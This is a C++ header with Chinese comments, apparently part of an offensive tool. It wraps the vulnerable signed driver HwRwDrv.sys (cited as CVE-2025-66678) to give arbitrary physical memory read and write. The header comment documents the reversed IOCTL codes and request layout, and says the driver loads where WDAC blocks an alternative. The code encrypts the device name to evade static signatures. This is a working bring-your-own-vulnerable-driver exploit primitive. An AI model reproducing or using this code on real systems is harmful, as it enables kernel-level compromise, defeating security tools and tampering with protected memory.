#pragma once
#include "stdafx.h"
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include "str_enc.h"

// ============================================================================
// HwRwDrv.sys 适配层 (CVE-2025-66678, Open Source Developer Jun Liu / Certum 2021 签名)
// 真机可用 (InsDrv 实测可加载) —— 替代 PMAD (真机被 WDAC 拒)
//
// 逆向结论 (dumpbin, 0x110D8 分发函数):
//   设备名: \\.\HwRwDrv  (\Device\HwRwDrv)
//   ★ 物理内存读: IOCTL 0x9C406104 → 函数 0x114E4 (MmMapIoSpace + rep movs 映射区→缓冲)
//   ★ 物理内存写: IOCTL 0x9C40A108 → 函数 0x115B4 (MmMapIoSpace + rep movs 缓冲→映射区)
//   0x9C402084 rdmsr / 0x9C402088 wrmsr / 0x9C40208C rdpmc
//   0x9C4060C4..D4 端口 I/O / 0x9C406144 PCI 配置
//
// 物理内存读写协议 (输入 16 字节, 读/写共用结构):
//   struct HWRW_REQ {           // 16 字节
//       uint64_t PhysAddr;      // +0x00  目标物理地址
//       uint32_t OpType;        // +0x08  1=字节 2=双字 3=字 (拷贝粒度)
//       uint32_t Size;          // +0x0C  元素个数
//   };
//   - 总字节数 = Size × OpType (imul [rcx+0C], [rcx+8])
//   - 驱动校验输入长度 (读: ==16; 写: >= 16+数据)
//   - MmMapIoSpace(PhysAddr, 总字节数, 0) → rep movs → MmUnmapIoSpace
//   - 读: 数据写回 SystemBuffer+0x10; 写: 数据从 SystemBuffer+0x10 取
// ============================================================================

#define IOCTL_HWRW_READMEM  0x9C406104   // 物理内存读
#define IOCTL_HWRW_WRITEMEM 0x9C40A108   // 物理内存写

#pragma pack(push, 1)
struct HWRW_REQ
{
    uint64_t PhysAddr;   // 目标物理地址
    uint32_t OpType;     // 1=字节 2=双字 3=字
    uint32_t Size;       // 元素个数 (总字节 = Size * OpType)
};
// 读写数据紧随请求头 (SystemBuffer + 16)
#pragma pack(pop)

static_assert(sizeof(HWRW_REQ) == 16, "bad HWRW req size");

inline HANDLE g_hDevice = nullptr;

inline bool OpenDriverDevice()
{
    // 设备名运行时解密,避免静态特征
    std::string dev = SX("\\\\.\\HwRwDrv");
    HANDLE hDevice = CreateFileA(
        dev.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open device. gle=%lu\n", GetLastError());
        return false;
    }
    g_hDevice = hDevice;
    return true;
}

// ----------------------------------------------------------------------------
// 物理内存读: IOCTL 0x9C406104 (驱动: MmMapIoSpace → 映射区 → SystemBuffer)
// ----------------------------------------------------------------------------
inline bool ReadPhysMemory(HANDLE hDevice, uint64_t offset, void* buffer, size_t size)
{
    if (hDevice == nullptr || hDevice == INVALID_HANDLE_VALUE)
    {
        printf("ReadPhysMemory failed: invalid device handle\n");
        return false;
    }
    if (buffer == nullptr && size != 0)
    {
        printf("ReadPhysMemory failed: null output buffer\n");
        return false;
    }
    if (size == 0)
        return true;

    HWRW_REQ req{};
    req.PhysAddr = offset;
    req.OpType = 1;              // 字节粒度
    req.Size = static_cast<uint32_t>(size);

    DWORD bytesReturned = 0;

    printf("%s phys=0x%016llX size=%zu\n", SX("RD").c_str(),
        static_cast<unsigned long long>(offset), size);

    // 读: 输入 = 16B 请求头 (驱动硬校验 InputBufferLength == 0x10),
    //      输出 = size 字节, 数据写回输出缓冲开头 (SystemBuffer 开头)
    BOOL ok = DeviceIoControl(
        hDevice,
        IOCTL_HWRW_READMEM,
        &req,
        sizeof(HWRW_REQ),          // 16 字节, 必须 == 0x10
        buffer,
        static_cast<DWORD>(size),  // 输出缓冲
        &bytesReturned,
        nullptr
    );

    if (!ok)
    {
        printf("[-] %s failed. phys=0x%016llX gle=%lu\n", SX("RDF").c_str(),
            static_cast<unsigned long long>(offset), GetLastError());
        return false;
    }

    return true;
}

// ----------------------------------------------------------------------------
// 物理内存写: IOCTL 0x9C40A108 (驱动: MmMapIoSpace → SystemBuffer → 映射区)
// ----------------------------------------------------------------------------
inline bool WritePhysMemory(HANDLE hDevice, uint64_t offset, const void* buffer, size_t size)
{
    if (hDevice == nullptr || hDevice == INVALID_HANDLE_VALUE)
    {
        printf("WritePhysMemory failed: invalid device handle\n");
        return false;
    }
    if (buffer == nullptr && size != 0)
    {
        printf("WritePhysMemory failed: null input buffer\n");
        return false;
    }
    if (size == 0)
        return true;

    HWRW_REQ req{};
    req.PhysAddr = offset;
    req.OpType = 1;              // 字节粒度
    req.Size = static_cast<uint32_t>(size);

    std::vector<uint8_t> reqBuf(sizeof(HWRW_REQ) + size);
    memcpy(reqBuf.data(), &req, sizeof(HWRW_REQ));
    memcpy(reqBuf.data() + sizeof(HWRW_REQ), buffer, size);

    DWORD inputSize = static_cast<DWORD>(sizeof(HWRW_REQ) + size);
    DWORD bytesReturned = 0;

    printf("%s phys=0x%016llX size=%zu\n", SX("WT").c_str(),
        static_cast<unsigned long long>(offset), size);

    BOOL ok = DeviceIoControl(
        hDevice,
        IOCTL_HWRW_WRITEMEM,
        reqBuf.data(),
        inputSize,
        reqBuf.data(),
        inputSize,
        &bytesReturned,
        nullptr
    );

    if (!ok)
    {
        printf("[-] %s failed. phys=0x%016llX gle=%lu\n", SX("WTF").c_str(),
            static_cast<unsigned long long>(offset), GetLastError());
        return false;
    }
    return true;
}

template <typename T>
inline bool ReadPhysType(HANDLE hDevice, uint64_t offset, T& outData)
{
    return ReadPhysMemory(hDevice, offset, &outData, sizeof(T));
}

template <typename T>
inline bool WritePhysType(HANDLE hDevice, uint64_t offset, const T& data)
{
    return WritePhysMemory(hDevice, offset, &data, sizeof(T));
}
